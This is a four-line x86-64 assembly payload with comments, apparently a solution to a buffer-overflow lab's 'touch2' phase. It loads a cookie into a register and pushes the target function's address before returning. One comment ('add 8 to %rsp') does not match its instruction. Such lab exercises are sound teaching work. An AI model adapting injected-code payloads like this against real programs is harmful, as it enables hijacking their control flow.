mov $0x6044e4,%edi # copy cookie to %edi
mov (%edi),%edi
movl $0x4017ec,(%rsp) # add 8 to %rsp, now the address is the entry of touch2
ret
